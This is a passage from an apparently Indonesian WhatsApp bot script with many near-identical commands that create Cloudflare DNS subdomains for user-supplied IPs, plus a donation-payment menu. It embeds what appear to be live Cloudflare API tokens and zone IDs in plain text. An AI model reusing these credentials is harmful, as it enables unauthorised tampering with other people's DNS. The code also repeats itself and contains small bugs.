           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain InzieOfc⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
case 'domain3': {
 
    if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5ac16dadc6a80d53657786f70c509a92";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "panellofficial.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain3 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By InzieOfc⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
           case 'domain4': {
 
    if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f2bc5ee0d4471aa74dd689c297c7aa43";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "panellofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain4 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By InzieOfc⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
           case 'domain5': {
 
    if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "57671edad3d50d309860d91d25385e05";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "celiapanellstore.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By InzieOfc⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
           case 'domain6': {
if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "46fc44dcb0af3809e8d05f9784aaa348";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "celiaofficial.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e[mess.success]) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By InzieOfc⚡_*`);
else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
}); }
break
case 'berdonasi': case 'donasi': {
RezzHost.sendMessage(from, {react: {text: "💸", key: m.key}})
let menunya = `Hai ${pushname} 👋
*JIKA INGIIN BER DONASI SILAHKAN MELALUI PAYMENT BERIKUT*
*BERAPAPUN DONASI YANG ANDA BERIKAN KAMI AKAN SANGAT MENGHARGAINYA😊
${ownername}

> *DANA :*
- 089667644225
> *OVO :*
- 089667644225
> *GOPAY :*
- 089667644225
> *PULSA :*
- 089667644225`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: menunya
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: " "
}),
header: proto.Message.InteractiveMessage.Header.create({
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/70dcb743b90275871fa98.jpg" } }, { upload: RezzHost.waUploadToServer })),
title: `InzieOfc`,
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "💶 COPY PAYMENT DANA",
"copy_code": `089667644225`
})},{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "💷 COPY PAYMENT OVO",
"copy_code": `089667644225`
})},{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "💵 COPY PAYMENT GOPAY",
"copy_code": `089667644225`
})},{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "💴 COPY PAYMENT PULSA",
"copy_code": `089667644225`
})}],}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: 'https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k',
newsletterName: `DONASI`,
serverMessageId: 145
}}})}}}, {quoted: m})
await RezzHost.relayMessage(from, msg.message, {
messageId: msg.key.id
}, {quoted:m})}
break
case 'domain7': {
 
if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3b464a9d67be6bea2b877fff0cee8577";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "vinzzxofficial.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain7 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
           case 'domain8': { 
if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "9d41b086735604b2c87aa3fcc1fb9068";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "vinnzofficial.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain8 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
           case 'domain9': {
 
if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3b464a9d67be6bea2b877fff0cee8577";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "vinzzxofficial.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain9 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
           case 'domain10': { 
if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "862d95f370e76ac2cca10fd8d5db5968";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "celiaofficial.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain10 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
           case 'domain11': {
 
if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a066b96a88912ed621e851c0a9fe0b08";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "celiaofficial.live";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain11 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain InzieOfc⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
           case 'domain12': {
 
    if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "1d6eb54f8c7e50870b1458c21816df4b";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "celiaofficial.email";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain12 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain InzieOfc⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
           case 'domain13': {
 
    if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3241645f1ad864d3ee03ba26cc55d880";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "celiaoffcial.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain13 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain InzieOfc⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
           case 'domain14': {
 
    if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ea22354b939b4b6ee6d9525130741a95";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "panellkuofficial.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain14 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain InzieOfc⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
           case 'domain15': {
 
    if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "946d5f35d0657cb8bfa442675b37ec42";
               let apitoken = "9IJl3ihBj_McQT6aG0D5MBFQH3YmB1PO7Z34XLr1";
               let tld = "sellerpanel-vvip.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain15 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain InzieOfc⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
           case 'domain16': {
 
    if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d28c394ba64bf4ecfec1917829d8bced";
               let apitoken = "86ZA4NPGG6ijzlhuRKqc3X3qbH8mgvlzOPsrBApB";
               let tld = "shopwebsite.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain16 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain InzieOfc⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
           case 'domain17': {
 
if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "95a92e2d61881587d97147504adae179";
               let apitoken = "Gh2ZG8DO7MoD7behXJc9NilacIdSv9o1BnMxiY-S";
               let tld = "mypanell-store.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain17 hostname|167.29.379.23");
           let host1 = raw1
